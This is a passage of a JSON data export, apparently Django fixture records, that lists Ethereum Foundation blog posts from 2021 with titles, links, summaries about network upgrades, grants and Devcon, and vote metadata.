"2021-11-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11193.2787411, "slug": "update-on-the-partnership-between-ef-and-unicef-338", "topics": [80]}}, {"model": "app.post", "pk": 339, "fields": {"title": "Finalized no. 32", "link": "https://blog.ethereum.org/en/2021/11/22/finalized-no-32", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/22/finalized-no-32", "summary": "tl;dr  Kintsugi\ud83c\udf75 in progress -- testnet to come Stakers must upgrade for Arrow Glacier...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2021-11-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11189.4387411, "slug": "finalized-no-32-339", "topics": [75]}}, {"model": "app.post", "pk": 340, "fields": {"title": "Announcing Grants for Advocacy Non-Profits", "link": "https://blog.ethereum.org/en/2021/11/16/advocacy-grants", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/16/advocacy-grants", "summary": "The Ethereum Foundation is allocating 1 million USD in grant funding to organizations that educate governments and policymakers about Ethereum and blockchain technology. We encourage others in the Ethereum community to support their important work....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_85feb744f451f63fe2ce9b39a012fbdd.jpg", "profile": 10, "updated_on": "2021-11-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11177.9187411, "slug": "announcing-grants-for-advocacy-non-profits-340", "topics": [80]}}, {"model": "app.post", "pk": 341, "fields": {"title": "Arrow Glacier Upgrade Announcement", "link": "https://blog.ethereum.org/en/2021/11/10/arrow-glacier-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/10/arrow-glacier-announcement", "summary": "The Ethereum network will be undergoing a scheduled upgrade at block number 13,773,000, which is predicted to occur on Wednesday, December 8, 2021. The exact date is subject to change due to variable block times and timezones. Please upgrade your node before Sunday, December 5, 2021 to account for the...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_1c575fc7a087559b3f7476c86f1b8f6f.jpg", "profile": 10, "updated_on": "2021-11-10T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11166.3987411, "slug": "arrow-glacier-upgrade-announcement-341", "topics": [78]}}, {"model": "app.post", "pk": 342, "fields": {"title": "Allocation Update: Q2 2021", "link": "https://blog.ethereum.org/en/2021/11/04/esp-allocation-update-q2-2021", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/04/esp-allocation-update-q2-2021", "summary": "It's that time again - our Q2 grantee lineup is coming right up.  But before we get to that: ESP is hiring a Team Lead! We're looking for someone organized, innovative, and passionate about Ethereum. If you think you might be the right person to lead a small but...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2021-11-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11154.8787411, "slug": "allocation-update-q2-2021-342", "topics": [77]}}, {"model": "app.post", "pk": 343, "fields": {"title": "Announcing Devcon Archive V2", "link": "https://blog.ethereum.org/en/2021/11/03/devcon-archive-v2", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/03/devcon-archive-v2", "summary": "Devcon is coming in 2022 (along with something new \ud83e\udd2b), but ahead of our next event updates, we invite you to check out a completely refreshed Devcon archive....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_28fc1d8000e417fa3ae5e8492419bbc6.png", "profile": 10, "updated_on": "2021-11-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11152.9587411, "slug": "announcing-devcon-archive-v2-343", "topics": [72, 76]}}, {"model": "app.post", "pk": 344, "fields": {"title": "Finalized no. 31", "link": "https://blog.ethereum.org/en/2021/11/02/finalized-no-31", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/11/02/finalized-no-31", "summary": "This issue of Finalized is dedicated to the contextualization of a recently published paper describing three possible attacks on Ethereum's proof-of-stake algorithm.  tl;dr These are serious attacks with a formally-analyzed, technically-simple mitigation. A fix will be rolled out prior to the Merge and will not delay Merge timelines....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2021-11-02T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11151.0387411, "slug": "finalized-no-31-344", "topics": [75]}}, {"model": "app.post", "pk": 345, "fields": {"title": "Grantee Roundup: September 2021", "link": "https://blog.ethereum.org/en/2021/10/22/esp-grantee-roundup-sep-21", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/10/22/esp-grantee-roundup-sep-21", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we\u2019ll check in on a couple of projects that are well underway - or already at the finish line. Read on to learn about some recent milestones and achievements by...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2021-10-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11129.9187411, "slug": "grantee-roundup-september-2021-345", "topics": [77]}}, {"model": "app.post", "pk": 346, "fields": {"title": "Finalized no. 30", "link": "https://blog.ethereum.org/en/2021/10/19/finalized-no-30", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/10/19/finalized-no-30", "summary": "tl;dr  Altair is fast approaching. Upgrade your nodes! Now!...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2021-10-19T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11124.1587411, "slug": "finalized-no-30-346", "topics": [75]}}, {"model": "app.post", "pk": 347, "fields": {"title": "Amphora: A Major Merge Milestone", "link": "https://blog.ethereum.org/en/2021/10/15/amphora-merge-milestone", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/10/15/amphora-merge-milestone", "summary": "Earlier this year, the Rayonism hackathon kicked off to protoype the architecture for Ethereum's transition to proof of stake. The transition, often refered to as The Merge, will keep the existing beacon chain (eth2) and execution layer (eth1) clients, and \"merge\" both chains by making the beacon chain drive the...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_e930da14c684ed98ea0c81eb83d6e5b7.jpg", "profile": 10, "updated_on": "2021-10-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11116.4787411, "slug": "amphora-a-major-merge-milestone-347", "topics": [75]}}, {"model": "app.post", "pk": 348, "fields": {"title": "Altair Mainnet Announcement", "link": "https://blog.ethereum.org/en/2021/10/05/altair-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/10/05/altair-announcement", "summary": "The Altair beacon chain upgrade is ready to be activated on the Ethereum mainnet. The upgrade will go live at epoch 74240 (Oct 27, 2021, 10:56:23am UTC)....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/r&d.jpg", "profile": 10, "updated_on": "2021-10-05T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11097.2787411, "slug": "altair-mainnet-announcement-348", "topics": [78]}}, {"model": "app.post", "pk": 349, "fields": {"title": "Ethereum.org Translation Program: Milestones and Updates", "link": "https://blog.ethereum.org/en/2021/10/04/translation-program-update", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/10/04/translation-program-update", "summary": "The ethereum.org Translation Program has been live for over two years, and we are excited to share a couple of milestones we have hit since its inception, as well as some of our plans for the future.  Since we launched the initiative in 2019, over 2,000 community members have...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/ethereum-hero.png", "profile": 10, "updated_on": "2021-10-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11095.3587411, "slug": "ethereumorg-translation-program-milestones-and-updates-349", "topics": [79]}}, {"model": "app.post", "pk": 350, "fields": {"title": "Finalized no. 29", "link": "https://blog.ethereum.org/en/2021/09/28/finalized-no-29", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/09/28/finalized-no-29", "summary": "Altair is here; the Merge is coming.  tl;dr  Altair upgrade epoch set, mainnet client releases in progress \ud83d\udc40 Merge interop spec released. Devnets to follow \ud83c\udffa...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2021-09-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11083.8387411, "slug": "finalized-no-29-350", "topics": [75]}}, {"model": "app.post", "pk": 351, "fields": {"title": "Grantee Roundup: August 2021", "link": "https://blog.ethereum.org/en/2021/09/22/esp-grantee-roundup-aug-21", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/09/22/esp-grantee-roundup-aug-21", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we\u2019ll check in on a couple of projects that are well underway - or already at the finish line. Read on to learn about some recent milestones and achievements by...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2021-09-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11072.3187411, "slug": "grantee-roundup-august-2021-351", "topics": [77]}}, {"model": "app.post", "pk": 352, "fields": {"title": "Secured no. 1", "link": "https://blog.ethereum.org/en/2021/09/09/secured-no-1", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/09/09/secured-no-1", "summary": "Earlier this year, we launched a bug bounty program focused on finding issues in the beacon chain specification, and/or in client implementations (Lighthouse, Nimbus, Teku, Prysm etc...). The results (and vulnerability reports) have been enlightening as have the lessons learned while patching potential issues.  In this new series, we...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_630d77544672a1e0df792c0d71489bd6.jpg", "profile": 10, "updated_on": "2021-09-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11047.3587411, "slug": "secured-no-1-352", "topics": [75]}}, {"model": "app.post", "pk": 353, "fields": {"title": "Core Developer Apprenticeship Program: The Second Cohort", "link": "https://blog.ethereum.org/en/2021/09/06/core-dev-apprenticeship-second-cohort", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/09/06/core-dev-apprenticeship-second-cohort", "summary": "Does development of the core protocols that power the Ethereum blockchain excite you? Are you interested in getting involved at the most fundemental and technical levels of the Ethereum protocol?  I am excited to announce that we are now accepting applications for the second cohort of the Core Developer...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/r&d.jpg", "profile": 10, "updated_on": "2021-09-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11041.5987411, "slug": "core-developer-apprenticeship-program-the-second-cohort-353", "topics": [75]}}, {"model": "app.post", "pk": 354, "fields": {"title": "Finalized no. 28", "link": "https://blog.ethereum.org/en/2021/08/25/finalized-no-28", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/08/25/finalized-no-28", "summary": "The Road to Altair edition \ud83d\udee3\u2b50\ufe0f  tl;dr  Pyrmont upgrade successful, scenario testing underway Prater upgrade scheduled for September 2, 12pm UTC Mainnet to follow...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2021-08-25T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11018.5587411, "slug": "finalized-no-28-354", "topics": [75]}}, {"model": "app.post", "pk": 355, "fields": {"title": "Building Together: Execution-Layer Client Ecosystem Fundraise", "link": "https://blog.ethereum.org/en/2021/08/24/building-together", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/08/24/building-together", "summary": "Ethereum\u2019s diverse client ecosystem is at the foundation of all that we\u2019re building together. This includes both execution-layer and consensus-layer clients, both of which are essential parts of Ethereum's post-merge future.  Supporting execution-layer (formerly \u201cEth1\u201d) clients remains one of the Ethereum Foundation\u2019s highest priorities. These client teams have supported...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_85feb744f451f63fe2ce9b39a012fbdd.jpg", "profile": 10, "updated_on": "2021-08-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11016.6387411, "slug": "building-together-execution-layer-client-ecosystem-fundraise-355", "topics": [80]}}, {"model": "app.post", "pk": 356, "fields": {"title": "Grantee Roundup: July 2021", "link": "https://blog.ethereum.org/en/2021/08/06/esp-grantee-roundup-july-21", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/08/06/esp-grantee-roundup-july-21", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we\u2019ll check in on a couple of projects that are well underway - or already at the finish line. Read on to learn about some recent milestones and achievements by...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2021-08-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10982.0787411, "slug": "grantee-roundup-july-2021-356", "topics": [77]}}, {"model": "app.post", "pk": 357, "fields": {"title": "Finalized no. 27", "link": "https://blog.ethereum.org/en/2021/07/26/finalized-no-27", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/07/26/finalized-no-27", "summary": "tl;dr  It's time to upgrade for London Merge checklist and draft EIP released Altair devnets launch; clients position themselves for mainnet...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2021-07-26T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10960.9587411, "slug": "finalized-no-27-357", "topics": [75]}}, {"model": "app.post", "pk": 358, "fields": {"title": "Road to Devcon Meetup and Event Grants", "link": "https://blog.ethereum.org/en/2021/07/15/r2d-meetup-and-event-grants", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/07/15/r2d-meetup-and-event-grants", "summary": "Community organizers are the glue that holds the Ethereum ecosystem together, and whether they're leading large-scale events, local meetups, hackathons or seminars, we might all be wandering in the dark forest of the analog world without them. But where's the fun in relying on chance encounters with kindred spirits identified...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_9921db015e0d1e113ce44c717ea1b092.jpg", "profile": 10, "updated_on": "2021-07-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10939.8387411, "slug": "road-to-devcon-meetup-and-event-grants-358", "topics": [72, 76]}}, {"model": "app.post", "pk": 359, "fields": {"title": "London Mainnet Announcement", "link": "https://blog.ethereum.org/en/2021/07/15/london-mainnet-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/07/15/london-mainnet-announcement", "summary": "...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_78689668e1876c0ff3fc3f0eb1d1206b.jpg", "profile": 10, "updated_on": "2021-07-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10939.8387411, "slug": "london-mainnet-announcement-359", "topics": [78]}}, {"model": "app.post", "pk": 360, "fields": {"title": "Allocation Update: Q1 2021", "link": "https://blog.ethereum.org/en/2021/07/01/esp-allocation-update-q1-2021", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/07/01/esp-allocation-update-q1-2021", "summary": "Happy July! Read on for the list of projects funded in Q1 of this year.  But first: office hours are in session! Signups are open now through this Sunday (July 4) for teams or individuals to request a one-on-one call with the ESP team during the week of July...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2021-07-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10912.9587411, "slug": "allocation-update-q1-2021-360", "topics": [77]}}, {"model": "app.post", "pk": 361, "fields": {"title": "London Testnets Announcement", "link": "https://blog.ethereum.org/en/2021/06/18/london-testnets-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/06/18/london-testnets-announcement", "summary": "The long-anticipated London upgrade is now ready for deployement on the Ethereum testnets! The upgrade will first go live on Ropsten, at block 10499401, which is expected to happen around June 24, 2021.  This upgrade follows Berlin, which was activated only a few months ago on the Ethereum mainnet....", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_dc8a2520f38632471825db8919ecad7a.jpg", "profile": 10, "updated_on": "2021-06-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10887.9987411, "slug": "london-testnets-announcement-361", "topics": [78]}}, {"model": "app.post", "pk": 362, "fields": {"title": "Grantee Roundup: May 2021", "link": "https://blog.ethereum.org/en/2021/06/02/esp-grantee-roundup-may-2021", "source": 1, "normalized_link": "blog.ethereum.org/en/2021/06/02/esp-grantee-roundup-may-2021", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we\u2019ll check in on a couple of projects that are well underway - or already at the finish line. Read on to learn about some recent milestones and achievements by...", "content": "", "cover_photo_url": null, "profile": 10, "updated_on": "2021-06-02T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 0.0, "slug": "grantee-roundup-may-2021-362", "topics": []}}]